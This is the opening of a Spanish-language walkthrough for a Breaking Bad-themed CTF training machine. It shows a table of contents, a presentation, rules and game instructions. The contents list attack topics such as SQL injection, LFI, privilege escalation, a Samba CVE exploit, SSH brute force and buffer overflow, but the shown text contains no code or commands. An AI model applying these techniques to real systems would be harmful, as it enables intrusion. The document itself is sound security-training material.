<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
<head>
  <meta charset="utf-8" />
  <meta name="generator" content="pandoc" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
  <title>walkthrough</title>
  <style>
    code{white-space: pre-wrap;}
    span.smallcaps{font-variant: small-caps;}
    div.columns{display: flex; gap: min(4vw, 1.5em);}
    div.column{flex: auto; overflow-x: auto;}
    div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
    /* The extra [class] is a hack that increases specificity enough to
       override a similar rule in reveal.js */
    ul.task-list[class]{list-style: none;}
    ul.task-list li input[type="checkbox"] {
      font-size: inherit;
      width: 0.8em;
      margin: 0 0.8em 0.2em -1.6em;
      vertical-align: middle;
    }
    .display.math{display: block; text-align: center; margin: 0.5rem auto;}
  </style>
  <link rel="stylesheet" href="styles.css" />
</head>
<body>

<body>

<!-- Formulario de contraseña -->
<div id="login">
  <h2>Introduce la contraseña para acceder</h2>
  <input type="password" id="clave" placeholder="Contraseña">
  <button onclick="verificar()">Entrar</button>
</div>

<!-- Contenido protegido -->
<div id="contenido" style="display:none;">


<p><img src="cookbook/media/image1.png"
style="width:4.30208in;height:4.30208in" /></p>
<p>Los Pollos Hermanos — Breaking Server</p>
<p><em><strong>Una máquina CTF que te cocinará el cerebro (pero en buen
plan)</strong></em></p>
<p><strong><br />
</strong></p>
<h1 class="TOC-Heading" id="contenido">Contenido</h1>
<p><a href="#presentación"><strong>🐔 Presentación:</strong>
<span>10</span></a></p>
<p><a href="#instrucciones"><strong>🧪 Instrucciones</strong>
<span>12</span></a></p>
<p><a href="#_Toc207189779"><strong>🎮 ¿De qué va el juego?</strong>
<span>12</span></a></p>
<p><a href="#_Toc207189780"><strong>🐝 Las Moscas (10 retos)</strong>
<span>12</span></a></p>
<p><a href="#_Toc207189781"><strong>🚩 Las Banderas (15 retos)</strong>
<span>12</span></a></p>
<p><a href="#_Toc207189782"><strong>⚠️ Reglas del juego</strong>
<span>13</span></a></p>
<p><a href="#_Toc207189783"><strong>🧩 Pistas y secretos del
servidor</strong> <span>13</span></a></p>
<p><a href="#_Toc207189784"><strong>🎯 Objetivo final</strong>
<span>13</span></a></p>
<p><a
href="#guía-de-orden-de-resolución-ctf-los-pollos-hermanos-braking-server"><strong>🕵️‍♂️
Guía de Orden de Resolución CTF: Los Pollos Hermanos Braking
Server</strong> <span>14</span></a></p>
<p><a href="#_Toc207189786"><strong>🔐 Descripción General</strong>
<span>14</span></a></p>
<p><a href="#_Toc207189787"><strong>🐞 Parte 1: Las Moscas (Criptografía
- Steganografía - Forense - WEB - OSINT - Red - Misc)</strong>
<span>14</span></a></p>
<p><a href="#_Toc207189788"><strong>⚙️ Parte 2: Las Banderas (Sistemas,
Red, Forense)</strong> <span>15</span></a></p>
<p><a href="#_Toc207189789"><strong>🧠 Recomendaciones para los
Jugadores</strong> <span>15</span></a></p>
<p><a href="#_Toc207189790"><strong>📎 Observaciones del Autor</strong>
<span>15</span></a></p>
<p><a
href="#introducción-al-walkthrough-máquina-ctf-los-pollos-hermanos-breaking-server"><strong>🧬
Introducción al Walkthrough: Máquina CTF “Los Pollos Hermanos Breaking
Server”</strong> <span>16</span></a></p>
<p><a href="#_Toc207189792"><strong>🗂️ Categorías de retos
incluidas</strong> <span>16</span></a></p>
<p><a href="#_Toc207189793"><strong>⚙️ Modalidades de
interacción</strong> <span>16</span></a></p>
<p><a href="#_Toc207189794"><strong>💥 Objetivo formativo</strong>
<span>17</span></a></p>
<p><a href="#personajes"><strong>🐔 Personajes</strong>
<span>18</span></a></p>
<p><a href="#fase-0-reconocimiento-y-recopilación-inicial"><strong>🧭
Fase 0 – Reconocimiento y Recopilación Inicial</strong>
<span>20</span></a></p>
<p><a href="#_Toc207189797"><strong>🎯 Objetivo:</strong>
<span>20</span></a></p>
<p><a href="#_Toc207189798"><strong>🔍 Paso 1 – Escaneo detallado con
Nmap sobre los puertos encontrados</strong> <span>23</span></a></p>
<p><a href="#_Toc207189799"><strong>📂 Paso 2 – Enumeración por
servicio</strong> <span>25</span></a></p>
<p><a href="#_Toc207189800"><strong>Consejos:</strong>
<span>33</span></a></p>
<p><a href="#resolución-de-moscas"><strong>Resolución de Moscas</strong>
<span>41</span></a></p>
<p><a href="#mosca-1-verificación-web-inicial"><strong>🐝 Mosca 1 –
Verificación Web Inicial</strong> <span>42</span></a></p>
<p><a href="#_Toc207189803"><strong>🧠 Descripción del reto</strong>
<span>42</span></a></p>
<p><a href="#_Toc207189804"><strong>🧰 Herramientas necesarias</strong>
<span>42</span></a></p>
<p><a href="#_Toc207189805"><strong>🐾 Paso a paso de
resolución</strong> <span>42</span></a></p>
<p><a href="#_Toc207189806"><strong>🛡️ Notas técnicas</strong>
<span>46</span></a></p>
<p><a href="#_Toc207189807"><strong>🐝 Resultado final</strong>
<span>47</span></a></p>
<p><a href="#mosca-2-esteganografía-en-metadatos"><strong>🐝 Mosca 2 –
Esteganografía en Metadatos</strong> <span>48</span></a></p>
<p><a href="#_Toc207189809"><strong>🛠️ Herramientas necesarias</strong>
<span>48</span></a></p>
<p><a href="#_Toc207189810"><strong>📁 Fase 1 – Descarga y
reconocimiento del archivo</strong> <span>48</span></a></p>
<p><a href="#_Toc207189811"><strong>🔎 Fase 2 – Descifrando
Brainfuck</strong> <span>51</span></a></p>
<p><a href="#_Toc207189812"><strong>📊 Fase 3 – Análisis de
metadatos</strong> <span>52</span></a></p>
<p><a href="#_Toc207189813"><strong>✅ Fase Final –
Verificación</strong> <span>53</span></a></p>
<p><a href="#_Toc207189814"><strong>🐝 Resultado final</strong>
<span>53</span></a></p>
<p><a href="#mosca-3-código-qr"><strong>🐝 Mosca 3 – Código Qr</strong>
<span>54</span></a></p>
<p><a href="#_Toc207189816"><strong>🛠️ Herramientas necesarias</strong>
<span>54</span></a></p>
<p><a href="#_Toc207189817"><strong>📁 Fase 1 – Localización de la
pista</strong> <span>54</span></a></p>
<p><a href="#_Toc207189818"><strong>🔎 Fase 2 – Leer código Qr</strong>
<span>54</span></a></p>
<p><a href="#_Toc207189819"><strong>📤 Fase 3 – Analizar código
Qr</strong> <span>55</span></a></p>
<p><a href="#_Toc207189820"><strong>✅ Fase Final – Verificación
Web</strong> <span>55</span></a></p>
<p><a href="#_Toc207189821"><strong>🧠 Razonamiento técnico</strong>
<span>56</span></a></p>
<p><a href="#_Toc207189822"><strong>🐝 Resultado final</strong>
<span>56</span></a></p>
<p><a
href="#mosca-4-simulación-de-inyección-sql-en-formulario-web"><strong>🐝
Mosca 4 – Simulación de Inyección SQL en Formulario Web</strong>
<span>57</span></a></p>
<p><a href="#_Toc207189824"><strong>🧰 Herramientas necesarias</strong>
<span>57</span></a></p>
<p><a href="#_Toc207189825"><strong>📁 Descifrando la pista</strong>
<span>57</span></a></p>
<p><a href="#_Toc207189826"><strong>🌐 Acceso inicial</strong>
<span>60</span></a></p>
<p><a href="#_Toc207189827"><strong>🔎 Comportamiento del
formulario</strong> <span>61</span></a></p>
<p><a href="#_Toc207189828"><strong>🔍 Análisis de
vulnerabilidad</strong> <span>63</span></a></p>
<p><a href="#_Toc207189829"><strong>🧪 Ejecución de la
inyección</strong> <span>63</span></a></p>
<p><a href="#_Toc207189830"><strong>✅ Resultado esperado</strong>
<span>64</span></a></p>
<p><a href="#_Toc207189831"><strong>🧠 Razonamiento técnico</strong>
<span>64</span></a></p>
<p><a href="#_Toc207189832"><strong>🐝 Resultado final</strong>
<span>65</span></a></p>
<p><a
href="#mosca-5-crackeo-de-contraseña-de-archivo-protegido-.rar"><strong>🐝
Mosca 5 – Crackeo de Contraseña de Archivo Protegido (.rar)</strong>
<span>66</span></a></p>
<p><a href="#_Toc207189834"><strong>🧰 Herramientas necesarias</strong>
<span>66</span></a></p>
<p><a href="#_Toc207189835"><strong>📁 Contenido inicial</strong>
<span>66</span></a></p>
<p><a href="#_Toc207189836"><strong>🧠 Enunciado oculto</strong>
<span>66</span></a></p>
<p><a href="#_Toc207189837"><strong>🧪 Procedimiento paso a
paso</strong> <span>67</span></a></p>
<p><a href="#_Toc207189838"><strong>🧩 Resultado</strong>
<span>68</span></a></p>
<p><a href="#_Toc207189839"><strong>🧠 Razonamiento técnico</strong>
<span>69</span></a></p>
<p><a href="#mosca-6-descompresión-braille-oculto-en-imagen"><strong>🐝
Mosca 6 – Descompresión + Braille oculto en imagen</strong>
<span>70</span></a></p>
<p><a href="#_Toc207189841"><strong>📁 Contenido de la carpeta</strong>
<span>70</span></a></p>
<p><a href="#_Toc207189842"><strong>🔎 Análisis de la pista</strong>
<span>70</span></a></p>
<p><a href="#_Toc207189843"><strong>🧪 Paso a paso técnico</strong>
<span>71</span></a></p>
<p><a href="#_Toc207189844"><strong>🐞 Resultado final</strong>
<span>73</span></a></p>
<p><a href="#_Toc207189845"><strong>🧠 Razonamiento técnico</strong>
<span>73</span></a></p>
<p><a href="#mosca-7-md5-de-imagen-jpeg"><strong>🐝 Mosca 7 – MD5 de
Imagen JPEG</strong> <span>74</span></a></p>
<p><a href="#_Toc207189847"><strong>🧰 Herramientas necesarias</strong>
<span>74</span></a></p>
<p><a href="#_Toc207189848"><strong>📜 Pista inicial</strong>
<span>74</span></a></p>
<p><a href="#_Toc207189849"><strong>🧪 Procedimiento técnico</strong>
<span>77</span></a></p>
<p><a href="#_Toc207189850"><strong>🐞 Resultado final</strong>
<span>78</span></a></p>
<p><a href="#_Toc207189851"><strong>🧠 Razonamiento técnico</strong>
<span>78</span></a></p>
<p><a href="#mosca-8-investigación-de-persona-desaparecida"><strong>🐝
Mosca 8 – Investigación de Persona Desaparecida</strong>
<span>79</span></a></p>
<p><a href="#_Toc207189853"><strong>🧰 Herramientas necesarias</strong>
<span>79</span></a></p>
<p><a href="#_Toc207189854"><strong>🧪 Procedimiento técnico</strong>
<span>79</span></a></p>
<p><a href="#_Toc207189855"><strong>🐞 Resultado final</strong>
<span>87</span></a></p>
<p><a href="#_Toc207189856"><strong>🧠 Razonamiento técnico</strong>
<span>87</span></a></p>
<p><a href="#mosca-9-reconocimiento-de-tonos-dtmf-en-audio"><strong>🐝
Mosca 9 – Reconocimiento de Tonos DTMF en Audio</strong>
<span>88</span></a></p>
<p><a href="#_Toc207189858"><strong>🧰 Herramientas necesarias</strong>
<span>88</span></a></p>
<p><a href="#_Toc207189859"><strong>📜 Pista inicial</strong>
<span>88</span></a></p>
<p><a href="#_Toc207189860"><strong>🧪 Procedimiento técnico</strong>
<span>90</span></a></p>
<p><a href="#_Toc207189861"><strong>🐞 Resultado final</strong>
<span>92</span></a></p>
<p><a href="#_Toc207189862"><strong>🧠 Razonamiento técnico</strong>
<span>92</span></a></p>
<p><a
href="#mosca-10-reconstrucción-de-jpeg-desde-tráfico-http"><strong>🐝
Mosca 10 – Reconstrucción de JPEG desde tráfico HTTP</strong>
<span>93</span></a></p>
<p><a href="#_Toc207189864"><strong>🧰 Herramientas necesarias</strong>
<span>93</span></a></p>
<p><a href="#_Toc207189865"><strong>📜 Pista inicial</strong>
<span>93</span></a></p>
<p><a href="#_Toc207189866"><strong>🧪 Procedimiento técnico</strong>
<span>97</span></a></p>
<p><a href="#_Toc207189867"><strong>🐞 Resultado final</strong>
<span>99</span></a></p>
<p><a href="#_Toc207189868"><strong>🧠 Razonamiento técnico</strong>
<span>99</span></a></p>
<p><a href="#resolución-de-banderas"><strong>Resolución de
Banderas</strong> <span>100</span></a></p>
<p><a
href="#bandera-1-escalada-de-privilegios-mediante-configuración-vulnerable-en-etcsudoers"><strong>🏁
Bandera 1 – Escalada de Privilegios mediante configuración vulnerable en
/etc/sudoers</strong> <span>101</span></a></p>
<p><a href="#_Toc207189871"><strong>🔍 Objetivo del reto</strong>
<span>101</span></a></p>
<p><a href="#_Toc207189872"><strong>⚙️ Preparación del entorno
realizada</strong> <span>101</span></a></p>
<p><a href="#_Toc207189873"><strong>📁 Bandera escondida</strong>
<span>102</span></a></p>
<p><a href="#_Toc207189874"><strong>🧪 Pasos para capturar la
bandera</strong> <span>103</span></a></p>
<p><a href="#_Toc207189875"><strong>🧠 Razonamiento técnico</strong>
<span>105</span></a></p>
<p><a href="#_Toc207189876"><strong>🐞 Resultado final</strong>
<span>105</span></a></p>
<p><a
href="#bandera-2-acceso-anónimo-a-servidor-ftp-con-archivos-ocultos"><strong>🏁
Bandera 2 – Acceso Anónimo a Servidor FTP con Archivos Ocultos</strong>
<span>106</span></a></p>
<p><a href="#_Toc207189878"><strong>🔍 Objetivo del reto</strong>
<span>106</span></a></p>
<p><a href="#_Toc207189879"><strong>⚙️ Entorno técnico
preparado</strong> <span>106</span></a></p>
<p><a href="#_Toc207189880"><strong>🧪 Pasos para capturar la
bandera</strong> <span>107</span></a></p>
<p><a href="#_Toc207189881"><strong>🧠 Razonamiento técnico</strong>
<span>109</span></a></p>
<p><a href="#_Toc207189882"><strong>🐞 Resultado final</strong>
<span>109</span></a></p>
<p><a
href="#bandera-3-binario-suid-vulnerable-a-comandos-arbitrarios"><strong>🏁
Bandera 3 – Binario SUID Vulnerable a Comandos Arbitrarios</strong>
<span>110</span></a></p>
<p><a href="#_Toc207189884"><strong>🔍 Objetivo del reto</strong>
<span>110</span></a></p>
<p><a href="#_Toc207189885"><strong>⚙️ Entorno técnico
preparado</strong> <span>110</span></a></p>
<p><a href="#_Toc207189886"><strong>🧪 Pasos para capturar la
bandera</strong> <span>114</span></a></p>
<p><a href="#_Toc207189887"><strong>🧠 Razonamiento técnico</strong>
<span>117</span></a></p>
<p><a href="#_Toc207189888"><strong>📌 Tip adicional</strong>
<span>117</span></a></p>
<p><a href="#_Toc207189889"><strong>🐞 Resultado final</strong>
<span>117</span></a></p>
<p><a href="#bandera-4-forense-de-archivos-sin-extensión"><strong>🏁
Bandera 4 – Forense de Archivos Sin Extensión</strong>
<span>118</span></a></p>
<p><a href="#_Toc207189891"><strong>🎯 Objetivo del reto</strong>
<span>118</span></a></p>
<p><a href="#_Toc207189892"><strong>📦 Contenido de la carpeta
Lavanderia</strong> <span>118</span></a></p>
<p><a href="#_Toc207189893"><strong>🧪 Pasos para capturar la
bandera</strong> <span>120</span></a></p>
<p><a href="#_Toc207189894"><strong>🧠 Razonamiento técnico</strong>
<span>124</span></a></p>
<p><a href="#_Toc207189895"><strong>🧰 Herramientas clave
recomendadas</strong> <span>124</span></a></p>
<p><a href="#_Toc207189896"><strong>🐞 Resultado final</strong>
<span>124</span></a></p>
<p><a href="#bandera-5-dns-malicioso-en-tráfico-.pcap"><strong>🏁
Bandera 5 – DNS Malicioso en Tráfico .pcap</strong>
<span>125</span></a></p>
<p><a href="#_Toc207189898"><strong>🎯 Objetivo del reto</strong>
<span>125</span></a></p>
<p><a href="#_Toc207189899"><strong>🔧 Entorno técnico simulado</strong>
<span>125</span></a></p>
<p><a href="#_Toc207189900"><strong>🧪 Pasos para capturar la
bandera</strong> <span>125</span></a></p>
<p><a href="#_Toc207189901"><strong>🧠 Razonamiento técnico</strong>
<span>128</span></a></p>
<p><a href="#_Toc207189902"><strong>🐞 Resultado final</strong>
<span>128</span></a></p>
<p><a href="#bandera-6-explotación-de-samba-cve-2017-7494"><strong>🏁
Bandera 6 – Explotación de Samba (CVE-2017-7494)</strong>
<span>129</span></a></p>
<p><a href="#_Toc207189904"><strong>🎯 Objetivo del reto</strong>
<span>129</span></a></p>
<p><a href="#_Toc207189905"><strong>⚙️ Entorno técnico
preparado</strong> <span>129</span></a></p>
<p><a href="#_Toc207189906"><strong>🧪 Pasos para capturar la
bandera</strong> <span>134</span></a></p>
<p><a href="#_Toc207189907"><strong>🧠 Razonamiento técnico</strong>
<span>136</span></a></p>
<p><a href="#_Toc207189908"><strong>🐞 Resultado final</strong>
<span>136</span></a></p>
<p><a
href="#bandera-7-fuerza-bruta-sobre-credenciales-ssh-débiles"><strong>🏁
Bandera 7 – Fuerza Bruta sobre Credenciales SSH Débiles</strong>
<span>137</span></a></p>
<p><a href="#_Toc207189910"><strong>🎯 Objetivo del reto</strong>
<span>137</span></a></p>
<p><a href="#_Toc207189911"><strong>⚙️ Entorno técnico
preparado</strong> <span>137</span></a></p>
<p><a href="#_Toc207189912"><strong>🧪 Pasos para capturar la
bandera</strong> <span>139</span></a></p>
<p><a href="#_Toc207189913"><strong>🧠 Razonamiento técnico</strong>
<span>143</span></a></p>
<p><a href="#_Toc207189914"><strong>🐞 Resultado final</strong>
<span>143</span></a></p>
<p><a
href="#bandera-8-certificado-tls-con-bandera-oculta-en-commonname"><strong>🏁
Bandera 8 – Certificado TLS con Bandera Oculta en CommonName</strong>
<span>144</span></a></p>
<p><a href="#_Toc207189916"><strong>🎯 Objetivo del reto</strong>
<span>144</span></a></p>
<p><a href="#_Toc207189917"><strong>⚙️ Entorno técnico
preparado</strong> <span>144</span></a></p>
<p><a href="#_Toc207189918"><strong>🧪 Pasos para capturar la
bandera</strong> <span>144</span></a></p>
<p><a href="#_Toc207189919"><strong>🧠 Razonamiento técnico</strong>
<span>147</span></a></p>
<p><a href="#_Toc207189920"><strong>🐞 Resultado final</strong>
<span>147</span></a></p>
<p><a
href="#bandera-9-servicio-netcat-escuchando-en-puerto-oculto"><strong>🏁
Bandera 9 – Servicio Netcat Escuchando en Puerto Oculto</strong>
<span>148</span></a></p>
<p><a href="#_Toc207189922"><strong>🎯 Objetivo del reto</strong>
<span>148</span></a></p>
<p><a href="#_Toc207189923"><strong>⚙️ Entorno técnico
configurado</strong> <span>148</span></a></p>
<p><a href="#_Toc207189924"><strong>🧪 Pasos para capturar la
bandera</strong> <span>151</span></a></p>
<p><a href="#_Toc207189925"><strong>🧠 Razonamiento técnico</strong>
<span>152</span></a></p>
<p><a href="#_Toc207189926"><strong>🐞 Resultado final</strong>
<span>152</span></a></p>
<p><a href="#bandera-10-vulnerabilidad-lfi-en-aplicación-php"><strong>🏁
Bandera 10 – Vulnerabilidad LFI en Aplicación PHP</strong>
<span>153</span></a></p>
<p><a href="#_Toc207189928"><strong>🎯 Objetivo del reto</strong>
<span>153</span></a></p>
<p><a href="#_Toc207189929"><strong>⚙️ Entorno técnico
configurado</strong> <span>153</span></a></p>
<p><a href="#_Toc207189930"><strong>🧪 Pasos para capturar la
bandera</strong> <span>154</span></a></p>
<p><a href="#_Toc207189931"><strong>🧠 Razonamiento técnico</strong>
<span>156</span></a></p>
<p><a href="#_Toc207189932"><strong>🐞 Resultado final</strong>
<span>156</span></a></p>
<p><a
href="#bandera-11-forense-de-pdf-con-códigos-de-ubicación"><strong>🏁
Bandera 11 – Forense de PDF con Códigos de Ubicación</strong>
<span>157</span></a></p>
<p><a href="#_Toc207189934"><strong>🎯 Objetivo del reto</strong>
<span>157</span></a></p>
<p><a href="#_Toc207189935"><strong>🧪 Pasos para capturar la
bandera</strong> <span>160</span></a></p>
<p><a href="#_Toc207189936"><strong>🧠 Razonamiento técnico</strong>
<span>163</span></a></p>
<p><a href="#_Toc207189937"><strong>🔧 Tip adicional</strong>
<span>163</span></a></p>
<p><a href="#_Toc207189938"><strong>🐞 Resultado final</strong>
<span>163</span></a></p>
<p><a
href="#bandera-12-linux-fundamentals-warm-up-breaking-the-txt"><strong>🏁
Bandera 12 – Linux Fundamentals / Warm-up: Breaking the TXT</strong>
<span>164</span></a></p>
<p><a href="#_Toc207189940"><strong>🎯 Objetivo del reto</strong>
<span>164</span></a></p>
<p><a href="#_Toc207189941"><strong>📜 Dinámica breve</strong>
<span>165</span></a></p>
<p><a href="#_Toc207189942"><strong>🧪 Pasos para capturar la
bandera</strong> <span>165</span></a></p>
<p><a href="#_Toc207189943"><strong>🧠 Razonamiento técnico</strong>
<span>167</span></a></p>
<p><a href="#_Toc207189944"><strong>🐞 Resultado final</strong>
<span>167</span></a></p>
<p><a
href="#bandera-13-análisis-forense-de-registro-auth.log"><strong>🏁
Bandera 13 – Análisis Forense de Registro auth.log</strong>
<span>168</span></a></p>
<p><a href="#_Toc207189946"><strong>🎯 Objetivo del reto</strong>
<span>168</span></a></p>
<p><a href="#_Toc207189947"><strong>🛠️ Entorno técnico
configurado</strong> <span>168</span></a></p>
<p><a href="#_Toc207189948"><strong>🧪 Pasos para capturar la
bandera</strong> <span>169</span></a></p>
<p><a href="#_Toc207189949"><strong>🧠 Razonamiento técnico</strong>
<span>172</span></a></p>
<p><a href="#_Toc207189950"><strong>🔧 Recomendaciones para jugadores
avanzados</strong> <span>172</span></a></p>
<p><a href="#_Toc207189951"><strong>🐞 Resultado final</strong>
<span>173</span></a></p>
<p><a
href="#bandera-14-análisis-forense-de-volcado-de-memoria-ram"><strong>🏁
Bandera 14 – Análisis Forense de Volcado de Memoria RAM</strong>
<span>174</span></a></p>
<p><a href="#_Toc207189953"><strong>🎯 Objetivo del reto</strong>
<span>174</span></a></p>
<p><a href="#_Toc207189954"><strong>⚙️ Entorno técnico
preparado</strong> <span>175</span></a></p>
<p><a href="#_Toc207189955"><strong>🧪 Pasos para capturar la
bandera</strong> <span>176</span></a></p>
<p><a href="#_Toc207189956"><strong>🧠 Razonamiento técnico</strong>
<span>178</span></a></p>
<p><a href="#_Toc207189957"><strong>🐞 Resultado final</strong>
<span>178</span></a></p>
<p><a
href="#bandera-15-buffer-overflow-para-ejecución-de-función-secreta"><strong>🏁
Bandera 15 – Buffer Overflow para Ejecución de Función Secreta</strong>
<span>179</span></a></p>
<p><a href="#_Toc207189959"><strong>🎯 Objetivo del reto</strong>
<span>179</span></a></p>
<p><a href="#_Toc207189960"><strong>🧠 ¿Qué es un Buffer
Overflow?</strong> <span>179</span></a></p>
<p><a href="#_Toc207189961"><strong>⚙️ Entorno técnico
preparado</strong> <span>182</span></a></p>
<p><a href="#_Toc207189962"><strong>🧪 Pasos para capturar la
bandera</strong> <span>182</span></a></p>
<p><a href="#_Toc207189963"><strong>🧠 Razonamiento técnico</strong>
<span>187</span></a></p>
<p><a href="#_Toc207189964"><strong>🐞 Resultado final</strong>
<span>187</span></a></p>
<p><a href="#bonus-final-osint"><strong>🏁 Bonus Final – OSINT</strong>
<span>188</span></a></p>
<p><a href="#herramientas-utilizadas"><strong>🧰 Herramientas
Utilizadas</strong> <span>196</span></a></p>
<p><a href="#herramientas-online-utilizadas"><strong>🧰 Herramientas
Online Utilizadas</strong> <span>199</span></a></p>
<p><a href="#resumen-final"><strong>🐞 Resumen Final</strong>
<span>201</span></a></p>
<p><a href="#_Toc207189969"><strong>Aprendizajes clave</strong>
<span>201</span></a></p>
<p><a href="#_Toc207189970"><strong>Parte 1: Moscas (criptografía,
stego, forense, web, OSINT, red)</strong> <span>201</span></a></p>
<p><a href="#_Toc207189971"><strong>Parte 2: Banderas (sistemas, red,
forense y privilegios)</strong> <span>202</span></a></p>
<p><a href="#_Toc207189972"><strong>Buenas prácticas y mentalidad
técnica</strong> <span>203</span></a></p>
<p><a href="#_Toc207189973"><strong>Qué te llevas aplicado al “mundo
real”</strong> <span>204</span></a></p>
<p><a href="#_Toc207189974"><strong>Siguientes pasos para
consolidar</strong> <span>204</span></a></p>
<p><strong><br />
</strong></p>
<h1 id="presentación"><strong>🐔 Presentación:</strong></h1>
<p><strong>🎬 Introducción:</strong></p>
<p>Sumérgete en una máquina CTF ambientada en el universo de
<em>Breaking Bad</em>, donde el análisis forense, la criptografía y la
explotación web se fusionan en una experiencia electrizante. En
<strong>Los Pollos Hermanos Breaking Server</strong>, no basta con
pensar como un hacker. Tienes que razonar como Heisenberg: estratégico,
preciso y un poco impredecible.</p>
<p><strong>🧠 Lo que aprenderás:</strong></p>
<p>Este reto está construido para enseñarte técnicas fundamentales y
avanzadas del pentesting, incluyendo:</p>
<ul>
<li><p><strong>Criptografía aplicada:</strong> análisis de hashes, QR,
mensajes ocultos.</p></li>
<li><p><strong>Esteganografía moderna:</strong> espectrogramas, imágenes
térmicas, audio codificado.</p></li>
<li><p><strong>Análisis Forense digital:</strong> estructura temporal
(ctime), memoria, logs alterados.</p></li>
<li><p><strong>Explotación Web:</strong> SQL Injection, Local File
Inclusion (LFI), configuraciones inseguras.</p></li>
<li><p><strong>Redes:</strong> tráfico .pcap con protocolos HTTP, DNS,
TLS, y servicios mal configurados como FTP anónimo.</p></li>
<li><p><strong>Escalada de privilegios y explotación de binarios
vulnerables.</strong></p></li>
<li><p><strong>OSINT realista:</strong> búsqueda de información oculta y
pistas digitales.</p></li>
<li><p><strong>Reconocimiento de sistemas:</strong> puertos, servicios,
y estructuras ocultas.</p></li>
</ul>
<p><strong>📂 Categorías de los retos:</strong></p>
<ul>
<li><p>🔐 Criptografía</p></li>
<li><p>🧬 Esteganografía</p></li>
<li><p>🔎 Forense</p></li>
<li><p>📡 Análisis de red</p></li>
<li><p>🕸️ Web Exploitation</p></li>
<li><p>🧨 Pwn &amp; Privilege Escalation</p></li>
<li><p>🧠 OSINT</p></li>
<li><p>🕵️ Reconocimiento</p></li>
</ul>
<p>Cada categoría incluye varias técnicas y herramientas ampliamente
utilizadas en auditorías reales: Wireshark, ExifTool, hashcat, steghide,
nmap, netcat, entre otros.</p>
<p><strong>💡 ¿Porqué jugar esta máquina?</strong></p>
<p>Porque no solo resolverás retos técnicos, sino que descifrarás una
narrativa envolvente ambientada en el universo de <em>Breaking Bad</em>.
Cada fase oculta pistas, secretos y vulnerabilidades que solo un
verdadero pentester sabrá extraer. Es ideal para:</p>
<ul>
<li><p>Estudiantes que quieren aprender con práctica realista.</p></li>
<li><p>Profesionales que buscan afilar sus técnicas.</p></li>
<li><p>Equipos que desean entrenar en simulaciones estilo Red
Team.</p></li>
<li><p>Cualquiera que quiera <em>cocinar su próxima bandera</em> como un
maestro del laboratorio.</p></li>
</ul>
<p><strong>🍳 Frase del chef:</strong></p>
<p>En el Server de “Los Pollos Hermanos” no solo sirven pollo...<br />
Sirven una experiencia digital inolvidable que te hará explotar — y no
por la cocina, sino por el conocimiento.</p>
<p><strong><br />
</strong></p>
<h1 id="instrucciones"><strong>🧪 Instrucciones</strong></h1>
<p>¡Bienvenido/a al desafío definitivo de <strong>Los Pollos Hermanos:
Breaking Server</strong>! 🌐🐔💣</p>
<p>Prepárate para sumergirte en un mundo de <strong>criptas, secretos y
exploits</strong> inspirado en el universo de <em>Breaking Bad</em>.
Esta <strong>máquina CTF</strong> ha sido diseñada con fines educativos,
pero también con un objetivo muy claro: <strong>poner a prueba tu
ingenio, tu habilidad y tu paciencia</strong>.</p>
<p><span id="_Toc207189779" class="anchor"></span><strong>🎮 ¿De qué va
el juego?</strong></p>
<p>Te enfrentas a una <strong>máquina CTF</strong> compuesta por
<strong>25 retos</strong> cuidadosamente distribuidos en dos
categorías:</p>
<p><span id="_Toc207189780" class="anchor"></span><strong>🐝 Las Moscas
(10 retos)</strong></p>
<ul>
<li><p>Inspiradas en el mítico capítulo “La Mosca”.</p></li>
<li><p>Están <strong>ocultas en el entorno web</strong> de la
máquina.</p></li>
<li><p>Puedes capturarlas sin salir del navegador, explorando el código
fuente, las rutas ocultas y los elementos sospechosos.</p></li>
<li><p>Al ser más accesibles, probablemente sean <strong>más fáciles de
resolver</strong>.</p></li>
<li><p>¡Atrápalas todas y comprueba tu caza en la <strong>página de
verificación de moscas</strong>!</p></li>
</ul>
<p><span id="_Toc207189781" class="anchor"></span><strong>🚩 Las
Banderas (15 retos)</strong></p>
<ul>
<li><p><strong>Esconden secretos más profundos</strong>, ocultos dentro
del servidor.</p></li>
<li><p>Requieren técnicas más elaboradas como:</p>
<ul>
<li><p>Escalada de privilegios</p></li>
<li><p>Inyección</p></li>
<li><p>Enumeración</p></li>
<li><p>Lectura de archivos protegidos</p></li>
</ul></li>
<li><p>¡Aquí se juega en serio! Las banderas están donde menos te lo
esperas… pero si sabes mirar, ahí estarán.</p></li>
<li><p>Cuando creas haber atrapado una, <strong>verifícala en las
páginas de comprobación de banderas y moscas</strong>. Note voy a decir
donde están esas páginas porque eso es tarea tuya.</p></li>
</ul>
<p><span id="_Toc207189782" class="anchor"></span><strong>⚠️ Reglas del
juego</strong></p>
<ul>
<li><p>❌ <strong>No hagas trampas.</strong> Muchas de las Flags se
pueden obtener de diferentes maneras; el reto no es solo conseguir la
Flag sino explotar la vulnerabilidad correspondiente. Consultar
soluciones mata la esencia del juego.</p></li>
<li><p>🎯 Este reto está hecho para <strong>aprender y
disfrutar</strong> del proceso, no para correr al final.</p></li>
<li><p>🧠 Si algo parece fácil… probablemente lo sea. Pero si parece
imposible, tal vez no lo sea tanto.</p></li>
</ul>
<p><span id="_Toc207189783" class="anchor"></span><strong>🧩 Pistas y
secretos del servidor</strong></p>
<ul>
<li><p>La fase de reconocimiento es la más importante. Hacerte con la
mayor cantidad de información de facilitará encontrar los
retos.</p></li>
<li><p>Busca por todos los directorios, por TODOS.</p></li>
<li><p>La DEA está detrás de los asuntos de Fring y tratan de cazarlo
con trampas; procura no caer en ellas.</p></li>
</ul>
<p><span id="_Toc207189784" class="anchor"></span><strong>🎯 Objetivo
final</strong></p>
<p>✅ Captura todas las <strong>Moscas</strong>.<br />
✅ Encuentra todas las <strong>Banderas</strong>.<br />
🧠 Y sobre todo: <strong>aprende, experimenta y juega
limpiamente</strong>.</p>
<p><em>"El respeto se gana, el poder se toma, y los secretos... se
descifran."</em><br />
— Gustavo Fring</p>
<p>¿Estás listo/a para entrar al laboratorio? 🧪<br />
¡Que comience el juego!</p>
<p><strong><br />
</strong></p>
<h1
id="guía-de-orden-de-resolución-ctf-los-pollos-hermanos-braking-server"><strong>🕵️‍♂️
Guía de Orden de Resolución CTF: Los Pollos Hermanos Braking
Server</strong></h1>
<p><strong>Versión de referencia para jugadores</strong><br />
<strong>Autor:</strong> José Pérez (www.unfantasmaenelsistema.com)<br />
<strong>Modo de juego:</strong> Máquina tipo CTF con 25 retos<br />
